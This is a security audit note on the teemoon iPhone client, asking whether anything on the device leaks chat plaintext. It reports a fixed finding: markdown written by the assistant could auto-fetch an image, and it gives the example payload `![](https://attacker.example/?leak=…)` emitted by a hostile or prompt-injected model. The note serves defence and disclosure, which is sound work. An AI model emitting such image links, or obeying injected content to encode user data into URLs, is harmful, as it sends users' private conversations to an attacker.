> **teemoonai/audits** — the teemoon iPhone client, plaintext-exfiltration review.
> The one plaintext-holding component with no attested identity, so this is a
> Tier-2 note, **not** a gated `index.json` identity page: a client build carries
> no image digest / compose hash for a link to key on, and the app shows no audit
> link for it. Reached from [`ARCHITECTURE.md`](ARCHITECTURE.md)'s "teemoon
> (device)" hop. Method: [`/notes/method.md`](/notes/method.md) — point-in-time,
> AI-assisted, verify everything yourself.

# teemoon iPhone client — can anything exfiltrate your plaintext?

Scoped to the iPhone build — the `teemoon-ios` source. The app target ships
iPhone-only (`TARGETED_DEVICE_FAMILY = 1`, `SUPPORTS_MACCATALYST = NO`); the
source's `#if os(macOS)` branches were read but are not a shipped product. The
coming Android client is a separate codebase and gets its own note when it ships.

The rest of this repo audits near.ai's side of end-to-end encryption: given that
plaintext exists in the model CVM, can any attested server component copy it
somewhere the operator or a third party can read? This note asks the same single
question of the **other** end of the E2EE — the device. The client composes every
prompt and decrypts every reply, so it holds plaintext unconditionally (the
yellow `APP` box in the architecture map). The question here is narrow and the
same: does anything on the device copy that plaintext to a log, an unprotected
file, the pasteboard, or a network destination other than the sealed send path?

## verdict: QUALIFIED-PASS — private at the reviewed commit, with one HIGH finding found and fixed before publish, and two residuals that are by-design, not defects

**Reviewed source:** `teemoonai/teemoon-ios` `main @ 722e6b2` plus the client
markdown-image fix described below (in the working tree at review time,
2026-08-31; the finding and its fix are what re-pin the publish candidate). The
final identity this note is keyed to is the published release commit — stamped
in when the code-only candidate is re-assembled (`assemble_publish_candidate.sh`,
release step 6.1). A client build with no page has not been reviewed; the same
fail-closed rule this repo applies to server images applies here.

This is a close-out review, not a from-scratch exhaustive audit: it re-walks the
device plaintext surface, verifies each load-bearing claim against source, and
adjudicates the one open finding. Everything below was read in the tree, not
relayed.

**Independent confirmation.** The prompt at the end of this note was re-run by a
separate Fable agent against the same fixed tree (finder→refuter, static source
read). It reproduced this verdict, confirmed the markdown-image fix holds on
every render path — including the streaming root, which the parser strip covers
even though the loader belt is not applied there — and found no additional
no-user-action exfil path.

---

## The one finding

### HIGH (deployed: no — fixed pre-publish 2026-08-31) — assistant markdown could auto-fetch a remote URL, exfiltrating plaintext with no user action

The transcript renders assistant-authored markdown with a vendored renderer
(`Vendor/textual`). Its attachment resolver defaults to the URL-fetching image
loader (`AttachmentLoader.swift:60`, `imageAttachmentLoader = .image()`), and on
render — **no tap** — `WithAttachments.task` fetches any image-run URL through
`ImageLoader`'s **own** `URLSession`, which is not the E2EE transport and is not
subject to the app's provider egress allowlist. Every transcript render path
reaches it: streaming replies go through `StructuredText.cached` unconditionally,
and settled replies route there whenever the content carries a heading, list,
code fence, table, or blockquote — trivially forced by a model that controls the
whole reply.

So a hostile provider, or a model steered by injected content (a tool result, a
web-search grounding snippet, a pasted document), could emit
`![](https://attacker.example/?leak=…)` and cause the device to issue a GET
carrying whatever the model encoded into the URL. That defeats the product's
central claim — "only you and the attested hardware can read these" — on the
**response** side, entirely outside the cryptographic perimeter the near.ai-side
audits and the client's own E2EE Phase-4 fixes protect. Confirmed reachable and
load-bearing against the reviewed bytes: the parser really does emit an
auto-fetchable `imageURL` for `![]()`, pinned by test.

**Remediation (shipped in the fix above, two layers):**

1. `CachedMarkdownParser.withoutRemoteImages` strips the `imageURL` attribute —
   the exact attribute the resolver keys off — at the single shared parser every
   transcript render flows through (the strip is not platform-gated). Alt text
   stays visible; no image is fetched.
2. `NoRemoteAttachmentLoader` (resolves nothing, issues no request) is installed
   at both hosting roots via `blockingRemoteTranscriptAttachments()`, beside the
   existing transcript styling, disabling both the image and custom-emoji
   loaders as a belt on the resolver itself.

Regression: `teemoonTests/MarkdownAttachmentExfiltrationTests` (5 tests,
including a proof that the un-stripped parser would have emitted the fetchable
URL, so the strip cannot become a silent no-op). App target builds; suite green.
No product capability is lost — the client sends no multimodal content and has no
feature that renders model-supplied remote images.

---

## What was checked and came back clean

Each verified in `teemoonai/teemoon-ios` source at the reviewed commit.

- **Send path fails closed.** There is exactly one send-authorization definition,
  `ConfidentialSession.sendPolicy` (`Confidential/ConfidentialSession+Verdict.swift:247`);
  `ChatViewModel` and every UI gate consult it, and the transport seals or throws
  rather than falling back to cleartext. A wrong-length model key degrades rather
  than nil-passing. (These were the July fail-open transport/verdict defects,
  closed in `846dc5c`.)
- **The Siri/Shortcuts entry point is gated too.** `RequestLLMIntent`
  (`App/RequestLLMIntent.swift:75`) calls `refusalDialog(policy: session.sendPolicy, …)`
  and refuses when the policy is not `.allow` — a headless intent cannot show a
  confirmation modal, so this also closes the cold-start window that a UI gate
  would have caught. It refuses an attested provider with no E2EE peer rather
  than sending in the clear.
- **Chat history at rest is encrypted and backup-excluded.** The SwiftData store
  and its `-wal`/`-shm` sidecars are set to `FileProtectionType.completeUnlessOpen`
  and `isExcludedFromBackup` (`App/teemoonApp.swift:227-240`), re-applied every
  launch. `.completeUnlessOpen` (not `.complete`) is a deliberate
  availability/locked-encryption trade documented at the write site.
- **The full-text search sidecar carries the same protection.** The FTS index is
  a second file holding the same message text; `ChatSearchService.configure`
  (`Chat/Search/ChatSearchService.swift:64`) and `rehardenIfNeeded` (`:87`) both
  run the identical hardening on it, so it is not a softer copy of the store.
- **Key copy is confined.** API-key copies go through
  `Clipboard.copySensitive` (`Views/PlatformChrome.swift:134`): `localOnly` with a
  120 s expiration on the shipped iPhone build (the unshipped macOS branch uses
  `org.nspasteboard.ConcealedType`). Regression:
  `SensitiveClipboardTests`.
- **The last-request debug card does not leak keys on copy.** `Authorization`
  and key-bearing headers are redacted on the copy path in every build (on-screen
  display is a deliberate developer-mode feature); attestation/body logging is
  bounded and `.private`. Regressions: `DebugCopyRedactionTests`,
  `LogBodyPreviewTests`.
- **No analytics, crash, or telemetry SDK.** `Package.resolved` across the app
  and all local packages contains no Firebase/Sentry/Amplitude/Mixpanel/
  Crashlytics/Datadog/Segment/etc.; no `track(`/`logEvent`/analytics call sites
  in source. There is no third-party pipe for plaintext to reach.

---

## Residuals — stated, not hidden

These are properties of the design, not bugs; a reader deciding to trust the
client should weigh them.

- **Opt-in web search is a content-driven egress.** If the user configures a
  Brave grounding key, the model can emit tool-call search queries — and a
  hostile model could encode prior context into one. They go only to the single
  fixed host the feature targets (`api.search.brave.com/res/v1/llm/context`,
  `BraveWebSearchTool.swift:514`), never to a model-chosen URL, and the tool
  extracts result *text* without fetching any result URL (`:483-509`). Keyless,
  the feature cannot search — it only shows an offer card. This is inherent to
  any web-search feature; the destination is the user's own chosen engine, not a
  silent channel. It is the one place adversary-influenced content reaches the
  network by design, so it is called out rather than buried.
- **Provider keys restore via encrypted backup.** The Keychain uses
  `kSecAttrAccessibleAfterFirstUnlock` (not `…ThisDeviceOnly`), so keys survive
  to a new device through an encrypted backup rather than re-entry
  (`Keychain.swift:41-50`; deliberate, OSS-audit decision 0.6). Not iCloud-synced
  (`kSecAttrSynchronizable` unset); keys live only in the Keychain, never in the
  persisted providers JSON.
- **An unattested provider sends plaintext by definition.** If the user
  configures a plain provider with no attestation / no E2EE peer, there is no
  ciphertext to protect and the send is cleartext to that endpoint. The gate
  above enforces the *attested* promise; it does not manufacture confidentiality
  a chosen endpoint never offered. This is the same truth the architecture note
  states for the degraded server path.
- **The user can still copy assistant content to the general pasteboard.** The
  code-block "copy" control (`Views/CodeBlock.swift:81`) uses the general
  pasteboard by design — it is a user-initiated copy of visible content, not a
  silent exfiltration, and is out of scope for the "no user action" question this
  note answers. Only *secrets* (keys) are routed through `copySensitive`.
- **E2EE metadata is plaintext by protocol.** Model id, sampling parameters,
  role sequence and per-field lengths travel unsealed by near.ai's E2EE design —
  the same perimeter the server-side audits describe. The client claims nothing
  beyond it; see the E2EE-perimeter treatment in the teemoon project's own audit.

---

## The audit prompt (reproducible)

This note was produced by the prompt below, its conclusions verified against
source, and re-run once by an independent Fable agent on the fixed tree. It is
deliberately **orthogonal** to the server-side method in
[`method.md`](/notes/method.md): that audits near.ai's attested images,
manifests and OS; this audits the device client. Neither depends on the other.
Re-run this against the release commit whenever the client changes — a client
build with no fresh run has not been audited.

> **CLIENT PLAINTEXT-EXFILTRATION AUDIT — teemoon Apple client (`teemoon-ios`).**
>
> The only question: on the user's device, can anything move the user's
> plaintext — prompt text, model replies, or provider API keys — to a place the
> user did not intend (a log, an unprotected or un-backup-excluded file, the
> system pasteboard, or a network destination other than the sealed provider
> send path)? Count paths that need **no user action** and paths driven by
> **adversary-controlled content** (a hostile or prompt-injected model reply, a
> tool result, a pasted document, a search-grounding snippet). Assume the
> model/provider is hostile. This is the device axis; do **not** audit near.ai
> server images / manifests / OS.
>
> Method: for each surface, trace from where plaintext exists to every sink and
> decide, with file:line evidence, whether a leak is reachable. Finder→refuter —
> try to disprove each suspected leak before reporting it. A finding sensitive
> before it is fixed gets file:line pointers, never a working exploit recipe.
>
> Surfaces: (1) **send path & egress** — can a request leave without E2EE for an
> attested provider; is send-authorization a single choke-point; any URLSession
> outside the provider egress that fetches attacker-influenced URLs. (2)
> **content renderers** — does any renderer (markdown, HTML, image, link
> preview, favicon) fetch a URL from model/user content on render, no tap. (3)
> **at-rest** — the store and every sidecar holding message text (incl. the FTS
> index and its `-wal`/`-shm`): file-protection class and backup exclusion,
> applied and re-applied each launch. (4) **pasteboard** — are secrets confined
> to a local/concealed/expiring pasteboard; any general-pasteboard or Handoff
> broadcast of plaintext. (5) **logs & crash** — `os_log`/`print` of bodies or
> keys (privacy level), any crash/analytics reporter, the debug card's redaction
> on display and copy. (6) **alternate entry points** — Siri/Shortcuts, widgets,
> Spotlight, share/notification extensions. (7) **dependencies** — `Vendor/` and
> SPM: any telemetry/analytics/crash SDK, or a component that makes its own
> network requests with app plaintext.
>
> Output: a verdict line opening with a class (private / leaks / compromisable /
> qualified-pass / inconclusive) plus caveats; findings as
> `### SEVERITY (deployed: yes/no[ — qualifier]) — title` with file:line
> evidence and a concrete leak scenario; residuals that are by-design; and what
> was not covered.

The verification is not optional and not transferable: this note records a read
of specific bytes, and the next client change re-opens it.
